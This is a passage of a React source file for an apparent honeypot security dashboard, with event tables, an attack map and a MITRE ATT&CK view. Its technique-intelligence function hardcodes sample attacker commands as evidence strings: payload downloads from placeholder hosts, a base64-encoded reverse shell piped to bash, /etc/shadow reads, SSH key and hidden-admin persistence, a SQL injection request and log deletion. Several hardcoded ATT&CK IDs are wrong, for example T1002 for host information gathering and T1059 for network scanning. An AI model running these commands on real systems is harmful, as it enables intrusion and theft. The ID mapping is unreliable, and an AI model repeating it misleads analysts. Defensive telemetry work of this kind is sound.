        <Panel title="Events by status" eyebrow="Unresolved / closed"><Chart option={statusOption} height={238} /></Panel>
      </div>

      <div className="overview-grid middle">
        <Panel title={period === "Daily" ? "Daily Telemetry" : period === "Weekly" ? "Weekly Telemetry" : "Monthly Telemetry"} eyebrow="Telemetry Events Timeline" className="wide"><Chart option={lineOption} height={222} /></Panel>
        <Panel title="Open event queue" eyebrow="Priority triage" action={<button className="text-button">View all<IconChevronRight size={14} /></button>}>
          <div className="compact-events">
            {(eventsList && eventsList.length ? eventsList : events).slice(0, 5).map((event) => (
              <div
                key={event.id}
                style={{ display: 'flex', alignItems: 'center', justifyContent: 'space-between', gap: '8px', padding: '6px 10px', borderRadius: '6px', background: '#0e1726', border: '1px solid var(--border)' }}
              >
                <button
                  style={{ flex: 1, display: 'flex', alignItems: 'center', gap: '10px', background: 'none', border: 'none', textAlign: 'left', cursor: 'pointer', color: 'inherit', padding: 0 }}
                  onClick={() => onEvent(event)}
                >
                  <span className={`event-dot ${event.severity.toLowerCase()}`} />
                  <span>
                    <strong style={{ fontSize: '12px', display: 'block' }}>{event.title}</strong>
                    <small style={{ color: 'var(--muted)', fontSize: '10px' }}>{event.destination} · {event.technique}</small>
                  </span>
                </button>
                <Severity value={event.severity} />
                {onDeleteEvent && (
                  <button
                    className="icon-button"
                    style={{ color: '#ff5c70', padding: '4px', flexShrink: 0 }}
                    onClick={(e) => {
                      e.stopPropagation();
                      onDeleteEvent(event);
                    }}
                    title="Delete event permanently"
                    aria-label="Delete event permanently"
                  >
                    <IconTrash size={14} />
                  </button>
                )}
              </div>
            ))}
          </div>
        </Panel>
      </div>

      <div className="overview-grid bottom">
        <Panel title="Top Attacker Commands & Tactic Distribution" eyebrow="Behavioral analysis"><Chart option={attackerCommandsOption} height={192} /></Panel>
        <Panel title="Captured Attacker Sessions" eyebrow="Threat session volume"><Chart option={sessionsOption} height={192} /></Panel>
        <Panel title="Incoming data sources" eyebrow="Events / second">
          <div className="source-list">{scaledDataSources.map(([name, count, percent]) => <div key={name}><span>{name}</span><div className="progress"><i style={{ width: `${percent}%` }} /></div><strong>{count}</strong></div>)}</div>
        </Panel>
      </div>
    </>
  );
}

function EventFilters({ query, setQuery, severity, setSeverity, status, setStatus }) {
  return (
    <div className="filter-bar">
      <label className="search-field"><IconSearch size={16} /><input value={query} onChange={(event) => setQuery(event.target.value)} placeholder="Search title, IP, sensor, technique…" /></label>
      <label className="select-field"><IconAlertTriangle size={15} /><select value={severity} onChange={(event) => setSeverity(event.target.value)}><option>All severities</option>{["Critical", "High", "Medium", "Low"].map((item) => <option key={item}>{item}</option>)}</select><IconChevronDown size={14} /></label>
      <label className="select-field"><IconFilter size={15} /><select value={status} onChange={(event) => setStatus(event.target.value)}><option>All statuses</option>{["New", "Investigating", "Captured", "Logged"].map((item) => <option key={item}>{item}</option>)}</select><IconChevronDown size={14} /></label>
      <button className="icon-button" title="Filter settings" aria-label="Filter settings"><IconAdjustmentsHorizontal size={17} /></button>
    </div>
  );
}

function EventsView({ query, setQuery, severity, setSeverity, status, setStatus, onEvent, onDeleteEvent, live, telemetry, eventsList }) {
  const filtered = useMemo(() => eventsList.filter((event) => {
    const matchText = `${event.title} ${event.sourceIp} ${event.destination} ${event.technique} ${event.command || ""} ${event.credentials || ""} ${event.summary || ""}`.toLowerCase().includes(query.toLowerCase());
    return matchText && (severity === "All severities" || event.severity === severity) && (status === "All statuses" || event.status === status);
  }), [eventsList, query, severity, status]);

  const criticalCount = useMemo(() => eventsList.filter((e) => e.severity === "Critical").length, [eventsList]);
  const capturedCount = useMemo(() => eventsList.filter((e) => e.status === "Captured" || e.status === "Logged").length, [eventsList]);

  return (
    <>
      <div className="metrics-grid four slim">
        <MetricCard label="Events today" value={formatNumber(eventsList.length)} delta="Live Sync" trend={[41, 48, 44, 62, 58, 73, eventsList.length]} />
        <MetricCard label="Critical open" value={formatNumber(criticalCount)} delta="Realtime" positive={false} accent={COLORS.red} trend={[19, 23, 22, 25, 24, 29, criticalCount]} />
        <MetricCard label="Auto-Captured" value={formatNumber(capturedCount)} delta="Decoy Mesh" accent={COLORS.green} trend={[77, 81, 84, 88, 91, 95, capturedCount]} />
        <MetricCard label="Sensors online" value="24 / 24" delta="Healthy" accent={COLORS.blue} trend={[24, 24, 23, 24, 24, 24, 24]} />
      </div>
      <Panel className="table-panel" title="Correlated event stream" eyebrow={live ? "Live · refreshes locally" : "Paused snapshot"} action={<span className={`stream-state ${live ? "on" : "off"}`}><i />{live ? "Streaming" : "Paused"}</span>}>
        {telemetry.lastEvent && <div className="live-ingest"><span><IconActivity size={15} /><b>Latest API event</b></span><code>{telemetry.lastEvent.event_id}</code><span>{telemetry.lastEvent.source_ip}</span><IconChevronRight size={13} /><span>{telemetry.lastEvent.target_service}</span><Severity value={telemetry.lastEvent.severity[0].toUpperCase() + telemetry.lastEvent.severity.slice(1)} /></div>}
        <EventFilters {...{ query, setQuery, severity, setSeverity, status, setStatus }} />
        <div className="table-scroll">
          <table>
            <thead>
              <tr>
                <th>Severity</th>
                <th>Event</th>
                <th>Source / Credentials</th>
                <th>Destination</th>
                <th>MITRE</th>
                <th>Status</th>
                <th>Analysis Engine</th>
                <th>Observed</th>
                <th style={{ width: '50px', textAlign: 'center' }}>Actions</th>
              </tr>
            </thead>
            <tbody>
              {filtered.slice(0, 70).map((event) => (
                <tr key={event.id} onClick={() => onEvent(event)} tabIndex="0">
                  <td><Severity value={event.severity} /></td>
                  <td><strong>{event.title}</strong><small>{event.id}{event.command ? ` · ${event.command}` : ""}</small></td>
                  <td><code>{event.sourceIp}</code><small>{event.credentials ? event.credentials : `${event.city}, ${event.country}`}</small></td>
                  <td><span>{event.destination}</span><small>{event.protocol}</small></td>
                  <td><code>{event.technique}</code><small>{event.tactic}</small></td>
                  <td><Status value={event.status} /></td>
                  <td>{event.analyst}</td>
                  <td>{formatTimestamp(event.timestamp)}</td>
                  <td style={{ textAlign: 'center' }} onClick={(e) => e.stopPropagation()}>
                    <button
                      className="icon-button"
                      style={{ color: '#ff5c70', opacity: 0.85 }}
                      onClick={(e) => {
                        e.stopPropagation();
                        if (onDeleteEvent) onDeleteEvent(event);
                      }}
                      title="Delete attack log permanently"
                      aria-label="Delete attack log permanently"
                    >
                      <IconTrash size={15} />
                    </button>
                  </td>
                </tr>
              ))}
            </tbody>
          </table>
          {!filtered.length && <TableEmpty />}
        </div>
        <footer className="table-footer"><span>Showing {Math.min(filtered.length, 70)} of {filtered.length} matching events</span><div><button disabled aria-label="Previous page"><IconChevronLeft size={14} /></button><button className="active" aria-label="Page 1">1</button><button aria-label="Page 2">2</button><button aria-label="Page 3">3</button><button aria-label="Next page"><IconChevronRight size={14} /></button></div></footer>
      </Panel>
    </>
  );
}

function localApiUrls() {
  const apiOrigin = import.meta.env.VITE_API_ORIGIN || `${window.location.protocol}//${window.location.hostname}:8000`;
  const wsProtocol = apiOrigin.startsWith("https:") ? "wss:" : "ws:";
  const wsOrigin = apiOrigin.replace(/^https?:/, wsProtocol);
  return { apiOrigin, wsOrigin };
}

function useLocalTelemetry(live) {
  const [telemetry, setTelemetry] = useState({ api: "checking", stream: "connecting", records: null, messages: 0, sequence: null, lastEvent: null });

  useEffect(() => {
    const controller = new AbortController();
    const { apiOrigin } = localApiUrls();
    window.fetch(`${apiOrigin}/api/v1/ready`, { signal: controller.signal, headers: { Accept: "application/json" } })
      .then((response) => response.ok ? response.json() : Promise.reject(new Error("readiness unavailable")))
      .then((payload) => setTelemetry((current) => ({ ...current, api: payload.status === "ready" ? "ready" : "degraded", records: payload.records ?? null })))
      .catch((error) => { if (error.name !== "AbortError") setTelemetry((current) => ({ ...current, api: "fallback" })); });
    return () => controller.abort();
  }, []);

  useEffect(() => {
    if (!live) {
      setTelemetry((current) => ({ ...current, stream: "paused" }));
      return undefined;
    }
    const { wsOrigin } = localApiUrls();
    const socket = new window.WebSocket(`${wsOrigin}/api/v1/stream/events?interval_ms=3000`);
    let closedByEffect = false;
    setTelemetry((current) => ({ ...current, stream: "connecting" }));
    socket.addEventListener("open", () => setTelemetry((current) => ({ ...current, stream: "connected" })));
    socket.addEventListener("message", (message) => {
      try {
        const payload = JSON.parse(message.data);
        if (!payload?.event?.synthetic) return;
        setTelemetry((current) => ({ ...current, stream: "connected", messages: current.messages + 1, sequence: payload.stream_sequence, lastEvent: payload.event }));
      } catch {
        setTelemetry((current) => ({ ...current, stream: "degraded" }));
      }
    });
    socket.addEventListener("error", () => setTelemetry((current) => ({ ...current, stream: "fallback" })));
    socket.addEventListener("close", () => { if (!closedByEffect) setTelemetry((current) => ({ ...current, stream: "fallback" })); });
    return () => { closedByEffect = true; socket.close(1000, "view paused"); };
  }, [live]);

  return telemetry;
}

function AttackMap({ period, setPeriod }) {
  const [zoom, setZoom] = useState(1.12);
  const [selected, setSelected] = useState(locations[0]);
  const factor = period === "Daily" ? 1 : period === "Weekly" ? 6.9 : 29.5;
  const postureConfig = {
    Daily: {
      title: "24-Hour Decoy Posture",
      observed: "1.8K",
      expected: "1.82K",
      percent: "98.9%",
      delta: "1.1%",
    },
    Weekly: {
      title: "Weekly Decoy Posture",
      observed: "13.2K",
      expected: "13.35K",
      percent: "98.9%",
      delta: "1.1%",
    },
    Monthly: {
      title: "Monthly Decoy Posture",
      observed: "56.8K",
      expected: "57.5K",
      percent: "98.8%",
      delta: "1.2%",
    },
  };
  const config = postureConfig[period] || postureConfig.Daily;
  const mapOption = useMemo(() => ({
    backgroundColor: "transparent",
    tooltip: { trigger: "item", backgroundColor: "#101a2d", borderColor: "#2c3e61", textStyle: { color: "#e4edfb" }, formatter: (params) => params.seriesType === "effectScatter" ? `<strong>${params.data.name}</strong><br/>${params.data.city}<br/>${formatNumber(params.data.value[2] * factor)} observed events` : "Synthetic telemetry region" },
    geo: { map: "soc-world", roam: true, zoom, center: [15, 22], itemStyle: { areaColor: "#15334f", borderWidth: 0 }, emphasis: { itemStyle: { areaColor: "#1c496d" }, label: { show: false } }, silent: false },
    series: [{ name: "Attack sources", type: "effectScatter", coordinateSystem: "geo", showEffectOn: "render", rippleEffect: { scale: 4, brushType: "stroke" }, symbolSize: (value) => 5 + Math.sqrt(value[2]) / 6, itemStyle: { color: COLORS.red, shadowBlur: 12, shadowColor: "#ff5c70" }, data: locations.map((item) => ({ name: item.country, city: item.city, value: [...item.coord, item.value] })) }],
  }), [factor, zoom]);
  const trendXAxis = period === "Daily"
    ? attackTrend.map((item) => item.label)
    : period === "Weekly"
      ? ["Mon", "Tue", "Wed", "Thu", "Fri", "Sat", "Sun"]
      : ["Week 1", "Week 2", "Week 3", "Week 4"];

  const trendObserved = period === "Daily"
    ? attackTrend.map((item) => item.current)
    : period === "Weekly"
      ? [2200, 2480, 2150, 2600, 2510, 1880, 2060]
      : [9400, 10800, 9900, 11200];

  const trendAverage = period === "Daily"
    ? attackTrend.map((item) => item.average)
    : period === "Weekly"
      ? [2100, 2300, 2200, 2500, 2400, 1900, 2000]
      : [9100, 10200, 9500, 10500];

  const trendOption = {
    tooltip: { trigger: "axis", backgroundColor: "#101a2d", borderColor: "#273653", textStyle: { color: "#dce8fb" } },
    legend: { right: 4, top: 0, data: ["Observed", "Rolling average"], textStyle: { color: "#7889a8", fontSize: 10 } },
    grid: { left: 42, right: 16, top: 34, bottom: 25 },
    xAxis: { type: "category", data: trendXAxis, boundaryGap: false, axisLabel: { color: "#70809e", fontSize: 10 }, axisLine: { lineStyle: { color: COLORS.grid } }, axisTick: { show: false } },
    yAxis: { type: "value", splitLine: { lineStyle: { color: COLORS.grid } }, axisLabel: { color: "#70809e", fontSize: 10 } },
    series: [
      { name: "Observed", type: "line", data: trendObserved, smooth: true, symbol: "none", itemStyle: { color: COLORS.red }, lineStyle: { color: COLORS.red, width: 2 }, areaStyle: { color: "rgba(255,92,112,.08)" } },
      { name: "Rolling average", type: "line", data: trendAverage, smooth: true, symbol: "none", itemStyle: { color: COLORS.blue }, lineStyle: { color: COLORS.blue, width: 1.5, type: "dashed" } },
    ],
  };
  return (
    <>
      <div className="page-actions"><div className="tab-switch"><button className="active">Web attacks</button></div><Segmented options={["Daily", "Weekly", "Monthly"]} value={period} onChange={setPeriod} label="Map period" /></div>
      <Panel className="map-shell" title="Top attack locations" eyebrow={`Last ${period === "Daily" ? "24 hours" : period === "Weekly" ? "7 days" : "30 days"}`} action={<span className="last-update"><IconRefresh size={14} /> Updated 18 seconds ago</span>}>
        <div className="map-layout">
          <div className="location-list">
            <div className="list-head"><span>Location</span><span>Share</span></div>
            {locations.slice(0, 12).map((item) => <button className={selected.country === item.country ? "active" : ""} key={item.country} onClick={() => setSelected(item)}><span><strong>{item.country}</strong><small>{item.city}</small></span><span><b>{item.percent}%</b><i style={{ width: `${item.percent}%` }} /></span></button>)}
          </div>
          <div className="map-stage">
            <Chart option={mapOption} height={520} />
            <div className="map-controls"><button aria-label="Zoom in" onClick={() => setZoom((z) => Math.min(3, z + .18))}><IconZoomIn size={17} /></button><button aria-label="Zoom out" onClick={() => setZoom((z) => Math.max(.8, z - .18))}><IconZoomOut size={17} /></button></div>
            <div className="map-card"><span className="eyebrow">Selected source</span><strong>{selected.country}</strong><span>{selected.city}</span><div><b>{formatNumber(selected.value * factor)}</b><small>observed events</small></div></div>
            <div className="map-legend"><span><i className="dot-critical" /> High volume</span><span><i className="dot-low" /> Lower volume</span></div>
          </div>
        </div>
      </Panel>
      <div className="map-stats">
        <Panel title="Attack volume" eyebrow="Compared with 30-day rolling average" className="wide"><Chart option={trendOption} height={235} /></Panel>
        <Panel title={config.title} eyebrow="Synthetic edge telemetry">
          <div className="volume-score"><strong>{config.percent}</strong><span className="delta negative"><IconArrowDownRight size={14} /> {config.delta}</span></div>
          <div className="posture-bar"><i style={{ width: config.percent }} /><b /></div>
          <div className="posture-labels"><span>Observed <b>{config.observed}</b></span><span>Expected <b>{config.expected}</b></span></div>
          <div className="map-notice"><IconShieldCheck size={20} /><span><strong>{config.percent} Active Decoy Telemetry Captured (All Sensors Healthy)</strong><small>No egress from decoy network</small></span></div>
        </Panel>
      </div>
    </>
  );
}

function RankedList({ rows, mode = "standard" }) {
  return <div className={`ranked-list ${mode}`}>{rows.map((row, index) => <div key={row[0]}><b>{index + 1}</b><span><strong>{row[1]}</strong><small>{row[0]}</small></span><em>{row[2]}</em>{row[3] !== undefined && <i>{row[3]}</i>}</div>)}</div>;
}

const getTechniqueDetails = (technique, tacticName, tacticIndex, techniqueIndex) => {
  let id = `T${1001 + tacticIndex * 7 + techniqueIndex}`;
  let subIds = [`${id}.001`];
  let subNames = [`Standard Sub-technique`];

  // Reconnaissance
  if (technique === "Active Scanning") {
    id = "T1595";
    subIds = ["T1595.001", "T1595.002"];
    subNames = ["IP Address Scan", "Vulnerability Scanning"];
  } else if (technique === "Gather Victim Host Information") {
    id = "T1002";
  } else if (technique === "Search Open Websites") {
    id = "T1003";
  } else if (technique === "Network Information DNS") {
    id = "T1004";
  }
  // Resource Development
  else if (technique === "Acquire Infrastructure") {
    id = "T1008";
  } else if (technique === "Develop Capabilities") {
    id = "T1009";
  } else if (technique === "Compromise Accounts") {
    id = "T1010";
  } else if (technique === "Stage Capabilities") {
    id = "T1011";
  }
  // Initial Access
  else if (technique === "Phishing") {
    id = "T1015";
  } else if (technique === "Exploit Public-Facing App") {
    id = "T1190";
  } else if (technique === "External Remote Services") {
    id = "T1017";
  } else if (technique === "Valid Accounts") {
    id = "T1018";
  }
  // Execution
  else if (technique === "Command and Scripting") {
    id = "T1059";
    subIds = ["T1059.001", "T1059.003"];
    subNames = ["PowerShell", "Windows Command Shell"];
  } else if (technique === "User Execution") {
    id = "T1204";
    subIds = ["T1204.002"];
    subNames = ["Malicious File"];
  } else if (technique === "Native API") {
    id = "T1024";
  } else if (technique === "Scheduled Task / Job") {
    id = "T1025";
  }
  // Persistence
  else if (technique === "Account Manipulation") {
    id = "T1029";
  } else if (technique === "Boot or Logon Autostart") {
    id = "T1030";
  } else if (technique === "Create Account") {
    id = "T1031";
  } else if (technique === "Server Software Component") {
    id = "T1032";
  }
  // Privilege Escalation
  else if (technique === "Abuse Elevation Control") {
    id = "T1548";
    subIds = ["T1548.002"];
    subNames = ["Bypass User Account Control"];
  } else if (technique === "Exploitation for Privilege") {
    id = "T1037";
  } else if (technique === "Process Injection") {
    id = "T1055";
    subIds = ["T1055.001"];
    subNames = ["Dynamic-link Library Injection"];
  } else if (technique === "Valid Accounts" && tacticName === "Privilege Escalation") {
    id = "T1039";
  }
  // Defense Evasion
  else if (technique === "Obfuscated Files") {
    id = "T1027";
    subIds = ["T1027.001"];
    subNames = ["Binary Padding"];
  } else if (technique === "Impair Defenses") {
    id = "T1562";
  } else if (technique === "Masquerading") {
    id = "T1036";
    subIds = ["T1036.005"];
    subNames = ["Match Legitimate Name or Location"];
  } else if (technique === "Indicator Removal") {
    id = "T1070";
    subIds = ["T1070.004"];
    subNames = ["File Deletion"];
  }
  // Credential Access
  else if (technique === "Brute Force") {
    id = "T1110";
    subIds = ["T1110.001", "T1110.004"];
    subNames = ["Password Guessing", "Credential Stuffing"];
  } else if (technique === "Credentials from Stores") {
    id = "T1051";
  } else if (technique === "Input Capture") {
    id = "T1052";
  } else if (technique === "OS Credential Dumping") {
    id = "T1053";
  }
  // Discovery
  else if (technique === "Account Discovery") {
    id = "T1057";
  } else if (technique === "File and Directory") {
    id = "T1083";
    subIds = ["T1083.001"];
    subNames = ["File Search"];
  } else if (technique === "Network Service Scan") {
    id = "T1059";
  } else if (technique === "System Information") {
    id = "T1060";
  }
  // Lateral Movement
  else if (technique === "Remote Services") {
    id = "T1021";
  } else if (technique === "Software Deployment") {
    id = "T1072";
  } else if (technique === "Internal Spearphishing") {
    id = "T1534";
  } else if (technique === "Replication Through Media") {
    id = "T1091";
  }
  // Collection
  else if (technique === "Archive Collected Data") {
    id = "T1119";
  } else if (technique === "Data from Local System") {
    id = "T1005";
  } else if (technique === "Email Collection") {
    id = "T1114";
  } else if (technique === "Screen Capture") {
    id = "T1113";
  }
  // Command and Control
  else if (technique === "Application Layer Protocol") {
    id = "T1071";
    subIds = ["T1071.001", "T1071.004"];
    subNames = ["Web Protocols", "DNS Tunneling"];
  } else if (technique === "Encrypted Channel") {
    id = "T1573";
  } else if (technique === "Proxy") {
    id = "T1090";
  } else if (technique === "Ingress Tool Transfer") {
    id = "T1105";
  }
  // Exfiltration
  else if (technique === "Exfiltration Over C2") {
    id = "T1041";
  } else if (technique === "Exfiltration Over Web") {
    id = "T1048";
  } else if (technique === "Automated Exfiltration") {
    id = "T1020";
  } else if (technique === "Transfer Size Limits") {
    id = "T1499";
  }
  // Impact
  else if (technique === "Data Destruction") {
    id = "T1485";
  } else if (technique === "Data Encrypted for Impact") {
    id = "T1486";
  } else if (technique === "Defacement") {
    id = "T1491";
  } else if (technique === "Service Stop") {
    id = "T1489";
  }

  return { id, subIds, subNames };
};

const getMitreIntelligence = (technique, tacticName, tacticIndex, techniqueIndex) => {
  const details = getTechniqueDetails(technique, tacticName, tacticIndex, techniqueIndex);
  const id = details.id;

  let severity = "medium";
  let description = "";
  let evidence = "";
  let sensors = [`${tacticName} Decoy`, "Canary Mesh"];

  switch (id) {
    // Reconnaissance
    case "T1595":
      severity = "high";
      description = "Adversaries execute active scans to evaluate exposed ports and target services.";
      evidence = "nmap -sS -p 22,80,443,8880";
      sensors = ["Web Canary Decoy", "Cowrie SSH Decoy"];
      break;
    case "T1002":
      severity = "medium";
      description = "Adversaries collect host-level configuration, OS details, and hostname metadata.";
      evidence = "uname -a && cat /etc/os-release";
      sensors = ["OS Telemetry Decoy", "Canary Mesh"];
      break;
    case "T1003":
      severity = "medium";
      description = "Adversaries index public web directories and exposed administrative endpoints.";
      evidence = "gobuster dir -u http://decoy-web/ -w /usr/share/wordlists/dirb/common.txt";
      sensors = ["Web Canary Decoy", "HTTP Honey-trap"];
      break;
    case "T1004":
      severity = "medium";
      description = "Adversaries query internal or public DNS records to map domain topology.";
      evidence = "dig AXFR decoy.local @192.168.1.1";
      sensors = ["DNS Canary Sensor", "Network Traffic Decoy"];
      break;

    // Resource Development
    case "T1008":
      severity = "medium";
      description = "Adversaries acquire domains, servers, or IP space to support ongoing attack infrastructure.";
      evidence = "DNS lookup query to newly registered suspicious C2 domains.";
      sensors = ["DNS Canary Sensor", "Canary Mesh"];
      break;
    case "T1009":
      severity = "medium";
      description = "Adversaries create or compile custom malware payloads, scripts, and exploit toolkits.";
      evidence = "Suspicious binary compilation artifact detected in temp storage.";
      sensors = ["OS Telemetry Decoy", "Canary Mesh"];
      break;
    case "T1010":
      severity = "high";
      description = "Adversaries compromise existing third-party accounts to facilitate initial access.";
      evidence = "Credential reuse attempt using leaked database hashes.";
      sensors = ["Identity Decoy Lure", "Web Canary Decoy"];
      break;
    case "T1011":
      severity = "medium";
      description = "Adversaries upload and stage attack tools on intermediate staging infrastructure.";
      evidence = "curl -O http://malicious-stage/payload.sh";
      sensors = ["Network Traffic Decoy", "Canary Mesh"];
      break;

    // Initial Access
    case "T1015":
      severity = "high";
      description = "Adversaries send spearphishing attachment or link payloads to gain initial footholds.";
      evidence = "SMTP inbound attachment scan: malicious_invoice.exe";
      sensors = ["SMTP Canary Sensor", "Canary Mesh"];
      break;
    case "T1190":
      severity = "critical";
      description = "Adversaries exploit web application vulnerabilities (e.g., SQLi, LFI) to gain access.";
      evidence = "GET /admin/db.php?id=1' UNION SELECT NULL,version()--";
      sensors = ["Web Canary Decoy", "Dionaea SMB Decoy"];
      break;
    case "T1017":
      severity = "high";
      description = "Adversaries leverage exposed remote services such as RDP, SSH, or VPN endpoints.";
      evidence = "Failed SSH root login attempt from unauthorized external IP.";
      sensors = ["Cowrie SSH Decoy", "RDP Lure Decoy"];
      break;
    case "T1018":
      severity = "high";
      description = "Adversaries obtain and use credentials of existing valid accounts to log in.";
      evidence = "Successful interactive login using default administrator credentials.";
      sensors = ["Identity Decoy Lure", "OS Telemetry Decoy"];
      break;

    // Execution
    case "T1059":
      if (technique === "Network Service Scan") {
        severity = "high";
        description = "Adversaries scan internal subnets to discover neighboring active hosts.";
        evidence = "netstat -tuln && arp -a";
        sensors = ["Network Traffic Decoy", "Canary Mesh"];
      } else {
        severity = "critical";
        description = "Adversaries execute malicious commands using shell scripting interpreters (bash, sh, powershell).";
        evidence = "sh -c 'wget http://malware-repo/drop.bin && chmod +x drop.bin'";
        sensors = ["Powershell Decoy Sensor", "Cowrie SSH Decoy"];
      }
      break;
    case "T1204":
      severity = "medium";
      description = "Adversaries rely on user interaction to run malicious code or executable files.";
      evidence = "Process spawn event: malware_setup.exe initiated by target shell.";
      sensors = ["Canary Mesh", "Web Canary Decoy"];
      break;
    case "T1024":
      severity = "high";
      description = "Adversaries directly execute OS API calls to bypass command monitoring tools.";
      evidence = "Direct system call execution: Native NtCreateThreadEx invoked.";
      sensors = ["OS Telemetry Decoy", "Canary Mesh"];
      break;
    case "T1025":
      severity = "high";
      description = "Adversaries create cron jobs or scheduled tasks to automate code execution.";
      evidence = "crontab -e modification: */5 * * * * /tmp/backdoor.sh";
      sensors = ["OS Telemetry Decoy", "Cowrie SSH Decoy"];
      break;

    // Persistence
    case "T1029":
      severity = "high";
      description = "Adversaries modify existing user accounts or SSH authorized keys to retain access.";
      evidence = "echo 'ssh-rsa AAAAB3...' >> ~/.ssh/authorized_keys";
      sensors = ["Cowrie SSH Decoy", "Canary Mesh"];
      break;
    case "T1030":
      severity = "high";
      description = "Adversaries configure autostart scripts in system boot locations for persistence.";
      evidence = "Persistence persistence entry added to /etc/init.d/malware_service";
      sensors = ["OS Telemetry Decoy", "Canary Mesh"];
      break;
    case "T1031":
      severity = "high";
      description = "Adversaries create new local or domain user accounts to maintain persistent access.";
      evidence = "useradd -m -g root -p '$1$secret' hidden_admin";
      sensors = ["OS Telemetry Decoy", "Identity Decoy Lure"];
      break;
    case "T1032":
      severity = "critical";
      description = "Adversaries install webshells or malicious modules inside web servers.";
      evidence = "Webshell file creation detected: /var/www/html/shell.php";
      sensors = ["Web Canary Decoy", "Canary Mesh"];
      break;

    // Privilege Escalation
    case "T1548":
      severity = "high";
      description = "Adversaries exploit sudo misconfigurations or SUID bits to elevate privileges.";
      evidence = "sudo -l execution & SUID binary abuse: find . -exec /bin/sh \\;";
      sensors = ["Cowrie SSH Decoy", "Canary Mesh"];
      break;
    case "T1037":
      severity = "critical";
      description = "Adversaries exploit kernel or service vulnerabilities to obtain root access.";
      evidence = "Kernel privilege escalation exploit attempt: PTRACE_TRACEME active.";
      sensors = ["OS Telemetry Decoy", "Canary Mesh"];
      break;
    case "T1055":
      severity = "high";
      description = "Adversaries inject malicious code into running processes to evade detection and elevate access.";
      evidence = "ptrace process injection targeting PID 1042 (systemd).";
      sensors = ["Canary Mesh", "OS Telemetry Decoy"];
      break;
    case "T1039":
      severity = "high";
      description = "Adversaries elevate privileges by switching to compromised high-privilege credentials.";
      evidence = "su - root invocation following credential discovery.";
      sensors = ["OS Telemetry Decoy", "Identity Decoy Lure"];
      break;

    // Defense Evasion
    case "T1027":
      severity = "medium";
      description = "Adversaries encode or encrypt scripts (base64) to hide payload intentions.";
      evidence = "echo 'YmFzaCAtaSA+JiAvZGV2L3RjcC8...' | base64 -d | bash";
      sensors = ["Cowrie SSH Decoy", "Canary Mesh"];
      break;
    case "T1562":
      severity = "high";
      description = "Adversaries disable firewall rules, audit logging, or security monitoring services.";
      evidence = "systemctl stop ufw && service auditd stop";
      sensors = ["OS Telemetry Decoy", "Network Traffic Decoy"];
      break;
    case "T1036":
      severity = "high";
      description = "Adversaries disguise malicious binaries under legitimate system names.";
      evidence = "Executable spawned as '/usr/sbin/systemd_update' from /tmp";
      sensors = ["Suricata EVE Sensor", "Canary Mesh"];
      break;
    case "T1070":
      severity = "critical";
      description = "Adversaries delete shell history files and logs to cover their tracks.";
      evidence = "cat /dev/null > ~/.bash_history && rm -rf /var/log/auth.log";
      sensors = ["Cowrie SSH Decoy", "Dionaea SMB Decoy"];
      break;

    // Credential Access
    case "T1110":
      severity = "critical";
      description = "Adversaries execute automated dictionary attacks against authentication interfaces.";
      evidence = "SSH password brute force attack: 150 failed attempts in 30 seconds.";
      sensors = ["Cowrie SSH Decoy", "RDP Lure Decoy"];
      break;
    case "T1051":
      severity = "high";
      description = "Adversaries search for saved passwords in configuration files or keyrings.";
      evidence = "grep -rnw '/var/www/' -e 'DB_PASSWORD'";
      sensors = ["Web Canary Decoy", "OS Telemetry Decoy"];
      break;
    case "T1052":
      severity = "high";
      description = "Adversaries log keystrokes or intercept credential prompts to steal credentials.";
      evidence = "Keylogger library hook detected on interactive terminal session.";
      sensors = ["Cowrie SSH Decoy", "Canary Mesh"];
      break;
    case "T1053":
      severity = "high";
      description = "Adversaries dump password hashes from system memory or the shadow file.";
      evidence = "cat /etc/shadow or Mimikatz memory dump attempt.";
      sensors = ["OS Telemetry Decoy", "Identity Decoy Lure"];
      break;

    // Discovery
    case "T1057":
      severity = "medium";
      description = "Adversaries enumerate system users and logged-in accounts.";
      evidence = "cat /etc/passwd && w && whoami";
      sensors = ["OS Telemetry Decoy", "Cowrie SSH Decoy"];
      break;
    case "T1083":
      severity = "medium";
      description = "Adversaries traverse directories to locate sensitive documents and databases.";
      evidence = "ls -la /home /root /var/backups";
      sensors = ["Dionaea SMB Decoy", "Cowrie SSH Decoy"];
      break;
    case "T1060":
      severity = "medium";
      description = "Adversaries gather OS version, architecture, and kernel patch details.";
      evidence = "uname -a && lsb_release -a";
      sensors = ["OS Telemetry Decoy", "Canary Mesh"];
      break;

    // Remaining Dynamic Techniques (Lateral Movement, Collection, C2, Exfiltration, Impact, etc.)
    default:
      severity = ["low", "medium", "high", "critical"][(tacticIndex + techniqueIndex) % 4];
      description = `Adversaries execute specialized behaviors associated with ${technique} (${id}) to support objectives within the ${tacticName} tactic domain.`;
      evidence = `Dynamic diagnostic payload: simulated-telemetry-${id.toLowerCase()} --technique "${technique.replaceAll('"', '\\"')}"`;
      sensors = [`${tacticName} Decoy`, "Canary Mesh"];
      break;
  }

  return { id, severity, description, evidence, sensors };
};

function MitreView({ period, setPeriod, onSelectMitre }) {
  const [query, setQuery] = useState("");
  const [activeTactic, setActiveTactic] = useState(null);

  const ds = mitreDatasets[period] || mitreDatasets.Daily;

  const factor = period === "Daily" ? 1 : period === "Weekly" ? 6.8 : 29.2;
  const scale = factor / 6.8;

  const scaledMitigations = ds.mitigations;
  const scaledTechniques = ds.techniques;
  const scaledThreatGroups = threatGroups.map(([id, name, count, val]) => [id, name, Math.round(count * scale), val]);

  const queryStr = query.trim().toLowerCase();
  const visible = mitreTactics.filter((tactic) => !activeTactic || tactic.name === activeTactic);

  const matchesQuery = (text, q) => {
    if (!q) return false;
    const normalizedText = text.toLowerCase();
    if (normalizedText.startsWith(q)) return true;
    const words = normalizedText.split(/[\s_\-\.\/]+/);
    return words.some(word => word.startsWith(q));
  };

  return (
    <>
      <div className="page-actions"><div className="mitre-title-mark"><IconTargetArrow size={19} /><span>Enterprise ATT&CK · v16</span></div><Segmented options={["Daily", "Weekly", "Monthly"]} value={period} onChange={setPeriod} label="MITRE period" /></div>
      <div className="mitre-summary">
        <Panel title="Top mitigations" eyebrow="Applied controls"><RankedList rows={scaledMitigations} /></Panel>
        <Panel title="Top techniques" eyebrow="Observed evidence"><RankedList rows={scaledTechniques} /></Panel>
        <Panel title="Top threat groups" eyebrow="Local correlation"><RankedList rows={scaledThreatGroups} mode="groups" /></Panel>
        <Panel title="Top tactics" eyebrow="Coverage share">
